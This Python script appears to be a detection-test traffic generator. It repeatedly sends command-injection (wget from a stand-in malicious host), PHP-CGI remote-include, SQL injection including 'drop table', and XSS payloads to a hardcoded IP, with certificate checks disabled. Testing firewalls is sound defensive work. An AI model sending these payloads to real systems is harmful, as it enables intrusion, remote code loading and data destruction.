import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def slow_visit(prefix):
    # num=13
    url_list = ['/bot',
                '/rootkit.php',
                '/test.php?path=%3Bwget%20http://malicious-domain/hack.php',
                '/cgi-bin/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp://attacker.com/evilcode.txt',
                '/stacked?a = 1; drop table b;',
                '/embedded?a = 1 and (select * from b where 1=1)',
                '/condition?a = 1 or 1 = 1',
                '/arithmetic?a = 1*1*1*1',
                '/sqlfunction?a = MOD(x,y)',
                '/tag?a=<input onfocus=write(1) autofocus>',
                '/attribute?id=1 onload="alert(0)"',
                '/css?a="style=-moz-binding:url(http://h4k.in/mozxss.xml#xss); a="',
                '/jsfunction?a=function test(){A=alert;A(1)}']

    for url in url_list:
        headers = {}
        if url == "/bot":
            headers['User-Agent'] = 'Cgichk'
        elif url == "/rootkit.php":
            headers['X_File'] = 'data.txt'

        try:
            resp = requests.get(prefix + url, headers=headers, verify=False, timeout=20)
            print("url_count:", i, ", resp:", resp.status_code, url)
        except Exception as e:
            print("Error: ", url, e)

if __name__ == "__main__":
    prefix = 'https://52.78.82.9:8080'
    for i in range(30):
        print("repeate_time:", i, "#"*50)
        slow_visit(prefix)
